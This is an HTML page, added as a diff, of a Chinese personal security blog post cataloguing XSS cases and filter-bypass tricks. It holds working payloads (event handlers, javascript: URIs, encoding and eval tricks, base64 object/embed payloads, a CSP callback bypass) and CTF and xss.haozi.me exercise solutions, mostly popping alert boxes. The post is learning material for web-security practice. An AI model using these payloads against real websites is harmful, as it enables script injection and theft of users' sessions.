@@ -1,0 +1,462 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="xss的常见情况及绕过姿势" />
+
+
+<meta name="description" content="今天正式结课了，开始我的暑假生活。因此来更新一下这两天玩xss的一些总结。
+
+xss，跨站脚本攻击，主要是由于用户输入恶意代码，没有什么过滤，导致浏览器当做正常的前端代码执行了而产生的。分为反射..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    xss的常见情况及绕过姿势 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="xss的常见情况及绕过姿势">
+            
+            xss的常见情况及绕过姿势
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/xss%E7%9A%84%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5%E5%8F%8A%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" rel="tag">xss的常见情况及绕过姿势</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/06/21</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>今天正式结课了，开始我的暑假生活。因此来更新一下这两天玩xss的一些总结。</p>
+<a id="more"></a>
+<p>xss，跨站脚本攻击，主要是由于用户输入恶意代码，没有什么过滤，导致浏览器当做正常的前端代码执行了而产生的。分为反射型、存储型和DOM型三种。都需要输入后输出在页面。</p>
+<ul>
+<li>反射型：前端-》后端-》输出到前端。</li>
+<li>存储型：前端-》后端-》存进数据库-》从数据库中取出-》输出到前端。</li>
+<li>DOM型：只在前端，主要靠document.write()和innerHTML。</li>
+</ul>
+<h2 id="常见情况"><a href="#常见情况" class="headerlink" title="常见情况"></a>常见情况</h2><ol>
+<li>没有过滤，直接上：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li>需要闭合标签：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>。注意也可能是单引号闭合（默认情况下htmlspecialchars()不会转义单引号）。绝对不要同时使用如：’”&gt;</li>
+<li>过滤了&lt;和&gt;, 使用事件。onclick, onmouseover, onerror等。</li>
+<li>如果事件也用不了，考虑伪协议：javascript:alert(1)。适合能够用src,href的标签如：a, iframe。</li>
+<li>可以考虑大小写混合绕过。</li>
+<li>如果删除了某些字，考虑双写。</li>
+<li>如果是在标签的属性中的值，是可以进行实体编码的，因此可以考虑进行HTML编码。如果是在<code>&lt;script&gt; ... &lt;/script&gt;</code>，js中的，无法进行HTML解码，因此需要使用eval()。</li>
+<li>有些跳转的a标签的链接需要使用包含跳转那个域名才行，可以考虑：<code>javascript:alert(1)/*http://xxx.com*/</code></li>
+<li>URL中的参数被过滤了，考虑：F12-&gt;搜索input标签，看看有没有hidden的input标签。</li>
+<li>看看页面有没有涉及到referrer、user-Agent和cookie的，可以抓包，然后替换成payload。</li>
+<li>ng-include可以包含同一域名下的文件，需要包含同一域名下的其它文件，且该文件需要存在反射型xss,就把那个链接作为payload。</li>
+<li>URL中可以使用%0a, %0d等, 如果是输入框，可以手动换行。</li>
+</ol>
+<h2 id="有一些过滤"><a href="#有一些过滤" class="headerlink" title="有一些过滤"></a>有一些过滤</h2><ol>
+<li><p>过滤了alert, 用<code>prompt,confirm,top[&#39;alert&#39;]</code>(1)。</p>
+</li>
+<li><p>过滤了(), 用``。</p>
+</li>
+<li><p>过滤了空格，用%0a,%0d,/**/。</p>
+</li>
+<li><p>输入的字符全部转为转大写情况下，HTML代码仍然能正常执行，但是js不行。那么对于script, 字符ſ大写后为S,因此可以换成：ſcript。同理svg。</p>
+</li>
+<li><p>过滤script,使用%00截断。javascr%00ipt:alert(1)。</p>
+</li>
+<li><p>使用编码。如果是在script标签中，对于js的字符串可以使用Unicode编码的。因此如果\没有被过滤， 那么可以使用：\u0027或者\x27。对于setTimeout这种函数，第一个值就是一个字符串，可以用Unicode编码。如果是出现在location.href中，还没弹框就重定向了，因此需要使用replace。<code>\u0027.replace(/.\u002b/,/javascript:alert(document.cookie)/.source);</code><br>闭合后成为一个字符串，调用replace函数将字符串值变为javascript:alert(1)。</p>
+</li>
+<li><p>如果是在script中的js代码，使用：  </p>
+<pre><code>` String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)`  </code></pre><p>  <code>eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))</code></p>
+</li>
+<li><p>标签中可以使用空格。如：。</p>
+</li>
+</ol>
+<h2 id="某些场景"><a href="#某些场景" class="headerlink" title="某些场景"></a>某些场景</h2><ol>
+<li><p>URL中有callback=，参数值是一个函数名。那么它肯定就是出现在js中。可以使用eval(‘alert(1)’);void 。使用void防止报错。如果callback这里不行，可以看看后面的参数。找到一个参数值输入后会解码一次的参数，输入payload，即：<code>xxx=%26callback=eval(String.fromCharCode(xx,xx));void</code> 这样子将前面的callback覆盖。</p>
+</li>
+<li><p>输出在标签的属性值中，可以使用HTML编码，但如果&amp;和#被过滤了，且输入是在URL中，可以用%26, %23代替。即&#x27; -&gt; %26%23x27;</p>
+</li>
+<li><p>如果使用双引号被实体编码了，不要放弃，看看：charset=gbxxx，如果是gb系列的，可以考虑宽字节。如：%df” 或者 %c0” 。</p>
+</li>
+<li><p>如果URL中有多个参数，并且他们的值最后会被拼接在一起，可以考虑：在第一个参数值处使用一个, 可能将一个双引号转义。在第二个参数值中：&amp;xxx==1;alert(1);function xxx(){}; js中会将后面函数的定义提前。</p>
+</li>
+<li><p>输入输出在注释中，使用换行符跳出注释，再用//注释后面的东西。注意，如果这个输出在注释的一个引号中作为值，换行后//又注释了闭合的引号，就会报错。那么可以先使用\然后再换行。因为用\就代表字符串换行了还是在一个值内，是被允许的。如：</p>
+<pre><code>// var b=&quot;aaa\  
+alert(1);//&quot;;</code></pre></li>
+<li><p>在URL的参数值中用一个, F12查看console中有没有报错，然后定位到相应的错误。在console中输入函数名可以看到该函数是怎么实现的。</p>
+</li>
+<li><p>出现在style中的background-color等样式中时，用expression(alert(‘1’));</p>
+</li>
+<li><p>对于DOMxss，URL中的一个参数值后面加##再加payload是可以的。##是分割的作用，##之前的参数值是正确的会被传进去验证，后面的payload会被保存在浏览器。因此：<code>?default=English##&lt;script&gt;alert(1)&lt;/script&gt;</code>常见页面就是根据en或cn进行中文、英文切换。</p>
+<h2 id="DOMxss"><a href="#DOMxss" class="headerlink" title="DOMxss"></a>DOMxss</h2><p>如果是innerHTML或者document.write()，必须用：<code>&lt;img src=1 onerror=alert(1)&gt;</code>。</p>
+</li>
+</ol>
+<p>寻找方法：首先查找有没有innerHTML,document.write，location.hash, window.name这些。然后定位到相应地方，查看其所在函数，看是否有什么过滤或者看看payload该怎么构造。</p>
+<ol>
+<li>location.hash, 在URL的#后面输出。</li>
+<li>window.name的话需要写一个HTML。<br><img src="https://pic.downk.cc/item/5eef5ae114195aa5947f144f.jpg" alt></li>
+</ol>
+<h2 id="iframe标签的payload"><a href="#iframe标签的payload" class="headerlink" title="iframe标签的payload"></a>iframe标签的payload</h2><pre><code>  1.1 最好懂的，onload执行js
+&lt;iframe on load=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;
+1.2 src 执行javascript代码
+&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;
+1.3 IE下vbscript执行代码
+&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;
+1.4 Chrome下data协议执行代码
+&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframeChrome
+1.5 上面的变体
+&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;
+1.6 Chrome下srcdoc属性
+&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></pre><h2 id="xss-haozi-me的题目"><a href="#xss-haozi-me的题目" class="headerlink" title="xss.haozi.me的题目"></a>xss.haozi.me的题目</h2><ol>
+<li>必须用<code>&lt;/textarea&gt;&lt;svg/onload=alert(1)&gt;</code>，得闭合前面的<code>&lt;textarea&gt;</code>。</li>
+<li>注释符：<br><img src="https://pic.downk.cc/item/5eef5bb414195aa5947fbe61.jpg" alt></li>
+<li>onclick和等号之间可以换行。</li>
+<li>如果必须以某个链接开头，那么可以用：<code>http://xxx.com/xxx.js&quot; onerror=&quot;alert(1)</code> xxx.js是自己乱加的，然后才能找不到从而报错，执行。</li>
+<li>如果是出现在script标签的src中，可以调用另外一个域的js文件，并且那个文件内容只有alert(1); 如果必须包含某个域，使用@。即：<code>http://xxx.com@xss.com/test.js</code></li>
+<li>输入都变成大写了，可以使用实体编码。</li>
+<li>注意–&gt;也是可以注释一行的。</li>
+<li>如果出现\转义双引号等，那么可以试试前面用一个\，可能没有将反斜杠转义。因此反斜杠就会与转义双引号的那个反斜杠凑一块了。<code>\&quot;);alert(1);//</code></li>
+</ol>
+<h2 id="存在CSP时"><a href="#存在CSP时" class="headerlink" title="存在CSP时"></a>存在CSP时</h2><p>CSP只允许src属性加载js文件时加载同一域名下的。因此本来对于callback函数，只需要使用：<code>?callback=alert(1);%0a//</code>的。有了CSP之后，必须使用script标签的src属性加载payload。即：<code>?callback=&lt;script src=&quot;?callback=alert(1);%0a//&quot;&gt;&lt;/script&gt;</code> 直接用?callback就表示是同一域名下的了。</p>
+<h2 id="一道CTF"><a href="#一道CTF" class="headerlink" title="一道CTF"></a>一道CTF</h2><p><a href="https://vizfina.exeye.run/summa?tag=a=attrs=onfocus=alert(152)%2526id=1%2526tabindex=0#1" target="_blank" rel="noopener">https://vizfina.exeye.run/summa?tag=a=attrs=onfocus=alert(152)%2526id=1%2526tabindex=0#1</a><br>根据读取页面的js代码来一步步构造。首先写死了一个tag参数，但是值没有写死。它的值是在等号与&amp;之间，因此如果值中要存在一个&amp;，必须再进行一次URL编码即%2526。然后等号后提取第一个字符作为标签名，因此只能用a或者p这些标签。显然应该用a标签。然后代码自己传了一个attrs进去，因此URL中也应该有attrs,而且也应该作为值，因此最好就是用等号连接：<code>?tag=a=attrs</code>。然后attrs又可以有值，它的值是xxx=xxx的形式，作为属性与值，这时payload变成：<code>?tag=a=attrs=onfocus=alert(152)</code>。但是这时的onfocus还不能准确聚焦到a标签，此时可以增加属性创建锚点以聚焦在a标签上。因此使用%2526来链接属性作为attrs的值。最后的payload：<code>?tag=a=attrs=onfocus=alert(152)%25%26id=1%26%26tabindex=0#1</code>。使用id=1,还有tabindex=0,最后#1来创建锚点并定位到这个a标签。</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;body onpageshow=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;hack the planet&lt;/marquee&gt;
+eval(&apos;~a~le~rt~~(~~1~~)~&apos;.replace(/~/g, &apos;&apos;))
+(1, eval)(&apos;alert(1)&apos;)
+&lt;embed src=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczL**yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot;&gt;&lt;/embed&gt;</code></pre><p>更多请看：<br><a href="https://www.freebuf.com/articles/web/226719.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/226719.html</a><br><a href="https://bbs.77169.net/forum.php?mod=viewthread&amp;tid=372573&amp;highlight=xss" target="_blank" rel="noopener">https://bbs.77169.net/forum.php?mod=viewthread&amp;tid=372573&amp;highlight=xss</a></p>
+<p>参考文章：<br><a href="https://www.secpulse.com/archives/107727.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/107727.html</a>   </p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/06/24/SSRF%E7%9A%84%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5%E5%8F%8A%E7%BB%95%E8%BF%87%E7%AD%89/" class="pre-post btn btn-default" title='SSRF的常见情况及绕过等'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            SSRF的常见情况及绕过等</span>
+    </a>
+    
+    
+    <a href="/2020/05/19/PHP%E8%BF%9E%E6%8E%A5MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C--%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/" class="next-post btn btn-default" title='PHP连接MySQL数据库操作--面向过程'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            PHP连接MySQL数据库操作--面向过程</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常见情况"><span class="toc-text">常见情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有一些过滤"><span class="toc-text">有一些过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#某些场景"><span class="toc-text">某些场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOMxss"><span class="toc-text">DOMxss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iframe标签的payload"><span class="toc-text">iframe标签的payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-haozi-me的题目"><span class="toc-text">xss.haozi.me的题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#存在CSP时"><span class="toc-text">存在CSP时</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一道CTF"><span class="toc-text">一道CTF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
